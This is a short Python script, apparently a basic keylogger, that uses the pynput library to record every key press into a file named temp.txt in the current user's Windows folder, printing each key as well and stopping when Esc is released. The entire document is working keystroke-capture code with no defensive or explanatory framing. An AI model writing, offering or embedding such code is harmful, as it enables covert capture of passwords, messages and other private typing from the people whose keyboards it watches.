import pynput
import getpass
from pynput.keyboard import Key, Listener
user = getpass.getuser()

def on_press(key):
    write(key)
    print(f"{key} pressed")

def on_release(key):
    if key == Key.esc:
        return False

def write(key):
    #write text
    f = open(fr"C:\Users\{user}\temp.txt", "a")
    f.write(str(key))
    f.close()



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
